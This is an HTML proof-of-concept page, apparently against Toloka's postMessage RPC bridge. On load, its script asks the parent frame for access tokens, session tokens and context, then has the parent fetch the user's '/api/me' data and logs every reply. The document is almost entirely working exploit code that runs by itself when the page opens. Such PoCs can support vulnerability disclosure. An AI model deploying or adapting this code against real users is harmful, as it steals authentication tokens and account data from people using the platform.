<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PoC - Toloka RPC Exploit</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    pre { white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h2>📡 PoC - getAccessToken / getToken / getContext / fetch</h2>
  <pre id="log">⏳ Waiting for responses...</pre>

  <script>
    const logEl = document.getElementById('log');
    const log = (...args) => {
      const text = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
      logEl.textContent += '\n' + text;
      console.log(...args);
    };

    function callRPC(method, payload = {}) {
      const id = crypto.randomUUID();

      window.addEventListener('message', function handler(e) {
        if (e.origin !== 'https://tb.toloka.dev') return;
        if (e.data?.id === id && e.data?.type === 'rpc') {
          log(`✅ [${method}]`, e.data.payload);
          window.removeEventListener('message', handler);
        }
      });

      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
      log(`📤 Sent ${method} with id ${id}`);
    }

    window.onload = () => {
      // أرسل الأوامر عند تحميل الصفحة
      ['getAccessToken', 'getToken', 'getContext'].forEach(method => callRPC(method));
      
      // طلب fetch لمعلومات المستخدم
      callRPC('fetch', {
        url: '/api/me',
        requestInit: { method: 'GET' }
      });
    };
  </script>
</body>
</html>
